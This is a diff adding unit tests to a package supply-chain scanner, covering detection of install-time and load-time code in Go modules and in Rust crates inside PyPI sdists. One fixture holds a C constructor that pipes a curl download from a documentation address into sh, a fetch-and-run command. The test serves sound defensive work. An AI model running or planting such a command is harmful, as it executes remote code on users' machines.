@@ -13,8 +13,13 @@ get for the same moment, and the same reasons and severities:
 - the rest runs when the code is called: its strong reasons are SC-USE-RISK.
 Test code a build leaves out is not read; //go:generate commands are listed
 (SC-GO-GENERATE, INFO); code larger than PACKAGE_CODE_CHARS is not read
-(INCOMPLETE). Each .go and .rs file gets the file rules too. A module or a
-crate with nothing found is OK: it used to be INCOMPLETE (N-1).
+(INCOMPLETE), and so is a file over the member limit. Each .go and .rs file
+gets the file rules too. A module or a crate with nothing found is OK: it used
+to be INCOMPLETE (N-1).
+
+N-17: the Rust crate inside a PyPI sdist (maturin, setuptools-rust), which pip
+has cargo build when it installs the sdist, is read the same way: each
+directory with a Cargo.toml is a crate, a .rs file is in the nearest one.
 
 The samples are inert fragments: never built, documentation addresses
 (203.0.113.x) and .invalid hosts.
@@ -229,6 +234,29 @@ class GoTests(unittest.TestCase):
         res = go({"m.go": CLEAN_GO + f'\nvar fixture = "{blob}"\n'})
         self.assertEqual(res["verdict"], "WARN")                             # (in code a build compiles: read)
 
+    def test_a_go_file_over_the_member_limit_is_incomplete(self):
+        # (the reader never saw it: a crate or a module with a 17 MB file was OK, unread)
+        with mock.patch.object(repo, "MAX_MEMBER", 100):
+            res = go({"m.go": CLEAN_GO, "big.go": "package m\n\n" + "// x\n" * 40})
+            self.assertEqual(res["verdict"], "INCOMPLETE")
+            self.assertEqual([i["file"] for i in res["issues"] if i["rule"] == "SC-TRUNCATED"], ["m@v1.0.0/big.go"])
+            res = go({"m.go": CLEAN_GO, "big_test.go": "package m\n\n" + "// x\n" * 40})
+            self.assertEqual(res["verdict"], "OK")                         # (a file no build compiles: not read anyway)
+
+    def test_cgo_c_is_kept_whatever_text_came_before_it(self):
+        constructor = '__attribute__((constructor)) static void boot(void) { system("curl -s https://203.0.113.7/a.sh | sh"); }\n'
+        files = {"m.go": 'package m\n\n// #include "boot.h"\nimport "C"\n\nfunc F() int { return 1 }\n',
+                 "a.txt": "x" * 400, "boot.h": "#include <stdlib.h>\n" + constructor}
+        with mock.patch.object(repo, "DEFERRED_TEXT_BUDGET", 100):
+            res = go(files)
+        self.assertEqual(res["verdict"], "SUSPICIOUS", res["issues"])
+        with mock.patch.object(repo, "PACKAGE_CODE_CHARS", 60):             # (the C not all kept: not read)
+            res = go({"m.go": files["m.go"][:40], "boot.h": files["boot.h"]})
+        self.assertEqual(res["verdict"], "INCOMPLETE")
+        (issue,) = [i for i in res["issues"] if i["rule"] == "SC-TRUNCATED"]
+        self.assertIn("the module's code (its C files not all kept) is more than the reader takes at once (60)",
+                      issue["msg"])
+
     def test_go_files_in_an_npm_package_are_not_read_as_a_module(self):
         data = crate_tgz({"package.json": '{"name": "x", "version": "1.0.0"}', "index.js": "module.exports = 1;\n",
                           "native/x.go": INIT_GO}, root="package")
@@ -286,6 +314,152 @@ class RustTests(unittest.TestCase):
         res = rust({"build.rs": PROBE_RS, "src/lib.rs": CLEAN_RS})
         self.assertEqual((res["verdict"], found(res)), ("OK", []))
         self.assertEqual(res["useTime"]["ofFiles"], 1)
+
+    def test_an_rs_file_over_the_member_limit_is_incomplete(self):
+        with mock.patch.object(repo, "MAX_MEMBER", 100):
+            res = rust({"src/lib.rs": CLEAN_RS, "src/big.rs": "// x\n" * 40})
+            self.assertEqual(res["verdict"], "INCOMPLETE")
+            res = rust({"src/lib.rs": CLEAN_RS, "tests/big.rs": "// x\n" * 40})
+            self.assertEqual(res["verdict"], "OK")
+
+
+PKG_INFO = "Metadata-Version: 2.1\nName: pkg\nVersion: 1.0\n\n"
+MATURIN = '[build-system]\nrequires = ["maturin>=1,<2"]\nbuild-backend = "maturin"\n'
+CARGO = '[package]\nname = "pkg"\nversion = "1.0.0"\nedition = "2021"\n\n[lib]\ncrate-type = ["cdylib"]\n'
+
+
+def sdist(files, order=None, root="pkg-1.0"):
+    """An sdist (a maturin project's, with its crate at the root unless `files` says otherwise), members in `order`."""
+    body = dict({"PKG-INFO": PKG_INFO, "pyproject.toml": MATURIN, "Cargo.toml": CARGO}, **files)
+    body = {k: v for k, v in body.items() if v is not None}
+    buf = io.BytesIO()
+    with tarfile.open(fileobj=buf, mode="w:gz") as tf:
+        for name in order or sorted(body):
+            raw = body[name] if isinstance(body[name], bytes) else body[name].encode("utf-8")
+            info = tarfile.TarInfo(f"{root}/{name}")
+            info.size = len(raw)
+            tf.addfile(info, io.BytesIO(raw))
+    return scan(buf.getvalue(), "tgz", "sdist")
+
+
+@unittest.skipUnless(_native.available(), f"native engine not built ({_native.load_error()})")
+class SdistCrateTests(unittest.TestCase):
+    """N-17: the Rust crate inside a PyPI sdist (maturin, setuptools-rust), which cargo builds when pip installs it."""
+
+    def test_a_build_script(self):
+        res = sdist({"src/lib.rs": CLEAN_RS, "build.rs": BUILD_RS})
+        self.assertEqual(res["verdict"], "SUSPICIOUS")
+        self.assertEqual(found(res), [("SC-INSTALL-HOOK", "CRITICAL", "build.rs", 5)])
+        (issue,) = [i for i in res["issues"] if i["rule"] == "SC-INSTALL-HOOK"]
+        self.assertTrue(issue["msg"].startswith("build.rs is the build script of a Rust crate in this sdist: pip has cargo "
+                                                "build the crate when it installs the sdist, and cargo runs the script on "
+                                                "that machine, and it "), issue["msg"])
+        self.assertEqual(issue["fix"], "Do not install this sdist; report it to PyPI.")
+        self.assertIn("pip builds an sdist's Rust extension with cargo", issue["why"])
+
+    def test_the_crate_a_file_is_in_is_the_nearest_one_above_it(self):
+        member = '[package]\nname = "helper"\nversion = "0.1.0"\n\n[lib]\nproc-macro = true\n'
+        res = sdist({"src/lib.rs": CLEAN_RS, "crates/helper/Cargo.toml": member, "crates/helper/src/lib.rs": MACRO_RS,
+                     "crates/helper/build.rs": BUILD_RS, "crates/helper/tests/t.rs": CTOR_RS, "rust/build.rs": BUILD_RS})
+        self.assertEqual(found(res), [("SC-INSTALL-HOOK", "CRITICAL", "crates/helper/build.rs", 5),
+                                      ("SC-INSTALL-HOOK", "CRITICAL", "crates/helper/src/lib.rs", 5)])
+        macro = [i["msg"] for i in res["issues"] if i["file"] == "crates/helper/src/lib.rs"]
+        self.assertTrue(macro[0].startswith("crates/helper/src/lib.rs is a procedural macro of a Rust crate in this sdist: "
+                                            "it runs inside the compiler when pip builds the sdist, and it "), macro)
+
+    def test_a_ctor_and_code_run_when_used(self):
+        res = sdist({"src/lib.rs": CTOR_RS})
+        (issue,) = [i for i in res["issues"] if i["rule"] == "SC-IMPORT-RISK"]
+        self.assertEqual((issue["sev"], issue["file"]), ("CRITICAL", "src/lib.rs"))
+        self.assertTrue(issue["msg"].startswith("src/lib.rs runs when the package's Rust extension is loaded, before any "
+                                                "of its code is called (#[ctor], a load section), and it "), issue["msg"])
+        res = sdist({"src/lib.rs": CLEAN_RS, "src/update.rs": USE_RS})
+        (issue,) = [i for i in res["issues"] if i["rule"] == "SC-USE-RISK"]
+        self.assertEqual((issue["file"], issue["line"]), ("src/update.rs", 2))
+        self.assertTrue(issue["msg"].endswith("Nothing runs it at build or load: it runs when the package's Rust code is "
+                                              "called."), issue["msg"])
+        self.assertEqual(issue["fix"], "Don't use the package; report it to PyPI.")
+
+    def test_a_clean_crate_is_read_and_ok(self):
+        res = sdist({"src/lib.rs": CLEAN_RS, "build.rs": PROBE_RS, "pkg/__init__.py": "from .pkg import *\n"})
+        self.assertEqual((res["verdict"], found(res)), ("OK", []))
+        self.assertEqual(res["filesScanned"], 3)                            # (the two .rs files and the module)
+        self.assertEqual(res["useTime"]["ofFiles"], 1)                      # (lib.rs; the module is import-time code)
+
+    def test_what_cargo_does_not_build_is_not_read(self):
+        blob = CTOR_RS + 'pub const K: &str = "' + "Zm9v" * 80 + '";\n'          # (the reader's and the file rules')
+        for files in ({"src/lib.rs": CLEAN_RS, "tests/t.rs": blob}, {"src/lib.rs": CLEAN_RS, "benches/b.rs": blob},
+                      {"src/lib.rs": CLEAN_RS, "examples/e.rs": blob},
+                      {"src/lib.rs": CLEAN_RS, "crates/x/Cargo.toml": CARGO, "crates/x/tests/t.rs": blob},
+                      {"Cargo.toml": None, "build.rs": BUILD_RS, "src/lib.rs": blob}):          # (no crate: no build)
+            with self.subTest(files=sorted(files)):
+                res = sdist(files)
+                self.assertEqual((res["verdict"], [i["rule"] for i in res["issues"]]), ("OK", []))
+        # outside the crate's src/: the file rules read it (cargo may include it), the reader does not
+        res = sdist({"src/lib.rs": CLEAN_RS, "docs/snippet.rs": blob})
+        self.assertEqual((res["verdict"], [i["rule"] for i in res["issues"]]), ("WARN", ["SC-B64"]))
+
+    def test_the_files_get_the_file_rules(self):
+        res = sdist({"src/lib.rs": CLEAN_RS + 'pub const K: &str = "' + "Zm9v" * 80 + '";\n'})
+        self.assertEqual(res["verdict"], "WARN", res["issues"])
+
+    def test_the_order_of_the_members_does_not_matter(self):
+        files = {"src/lib.rs": CLEAN_RS, "build.rs": BUILD_RS}
+        res = sdist(files, order=["build.rs", "src/lib.rs", "PKG-INFO", "pyproject.toml", "Cargo.toml"])
+        self.assertEqual(found(res), [("SC-INSTALL-HOOK", "CRITICAL", "build.rs", 5)])
+
+    def test_a_crate_file_not_read_makes_the_sdist_incomplete(self):
+        with mock.patch.object(repo, "MAX_MEMBER", 100):
+            res = sdist({"src/lib.rs": CLEAN_RS, "src/big.rs": "// x\n" * 40})
+            self.assertEqual(res["verdict"], "INCOMPLETE")
+            self.assertIn("src/big.rs is the code of a Rust crate this sdist builds, and it is larger than the 100-byte "
+                          "source-scan limit", [i["msg"] for i in res["issues"] if i["rule"] == "SC-TRUNCATED"][0])
+            res = sdist({"Cargo.toml": None, "rust/Cargo.toml": CARGO, "rust/src/lib.rs": CLEAN_RS,
+                         "docs/big.rs": "// x\n" * 40})                       # (in no crate: cargo never sees it)
+            self.assertEqual(res["verdict"], "OK")
+        with mock.patch.object(repo, "PACKAGE_CODE_CHARS", 150):
+            res = sdist({"src/lib.rs": CLEAN_RS, "src/more.rs": CLEAN_RS * 3})
+        self.assertEqual(res["verdict"], "INCOMPLETE")
+
+    def test_the_crates_share_one_use_time_budget(self):
+        two = {"a/Cargo.toml": '[package]\nname = "a"\nversion = "0.1.0"\n', "a/src/lib.rs": CLEAN_RS,
+               "b/Cargo.toml": '[package]\nname = "b"\nversion = "0.1.0"\n', "b/src/lib.rs": USE_RS, "Cargo.toml": None}
+        res = sdist(two)
+        self.assertEqual([r for r, _s, _f, _l in found(res)], ["SC-USE-RISK"])
+        with mock.patch.object(repo, "USE_RISK_CHARS", len(USE_RS) + 5):
+            res = sdist(two)
+        self.assertEqual((found(res), res["useTime"]["files"], res["useTime"]["ofFiles"]), ([], 1, 2))
+
+    def test_no_use_time_reading_once_suspicious(self):
+        escaped = "\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x65\\x76\\x69\\x6c"                 # (SC-HEXSTR: "http://evil")
+        res = sdist({"src/lib.rs": CLEAN_RS + f'pub const U: &str = "{escaped}";\n', "src/update.rs": USE_RS})
+        self.assertEqual([r for r, _s, _f, _l in found(res)], ["SC-HEXSTR"])
+        self.assertEqual((res["useTime"]["chars"], res["useTime"]["ofFiles"]), (0, 2))
+
+    def test_a_crate_whose_manifest_was_not_kept_is_not_read(self):
+        member = '[package]\nname = "x"\nversion = "0.1.0"\n'
+        files = {"src/lib.rs": CLEAN_RS, "crates/x/src/lib.rs": CLEAN_RS, "crates/x/Cargo.toml": member}
+        order = ["PKG-INFO", "pyproject.toml", "Cargo.toml", "src/lib.rs", "crates/x/src/lib.rs", "crates/x/Cargo.toml"]
+        kept = len(CARGO) + 2 * len(CLEAN_RS)                       # (the root's Cargo.toml and both lib.rs files)
+        with mock.patch.object(repo, "PACKAGE_CODE_CHARS", kept):
+            res = sdist(files, order=order)
+        self.assertEqual(res["verdict"], "INCOMPLETE")
+        self.assertEqual([i["file"] for i in res["issues"] if i["rule"] == "SC-TRUNCATED"], ["crates/x/src/lib.rs"])
+
+    def test_rust_in_an_npm_package_or_a_wheel_is_not_a_crate_built_here(self):
+        for kind, root, extra in (("npm", "package", {"package.json": '{"name": "x", "version": "1.0.0"}'}),
+                                  ("wheel", "", {"x/__init__.py": "\n"})):
+            with self.subTest(kind=kind):
+                files = dict({"native/Cargo.toml": CARGO, "native/build.rs": BUILD_RS}, **extra)
+                buf = io.BytesIO()
+                if kind == "wheel":
+                    with zipfile.ZipFile(buf, "w") as zf:
+                        for name, data in sorted(files.items()):
+                            zf.writestr(name, data)
+                    res = scan(buf.getvalue(), "zip", "wheel")
+                else:
+                    res = scan(crate_tgz(files, root=root), "tgz", "npm")
+                self.assertEqual(found(res), [])
 
 
 if __name__ == "__main__":
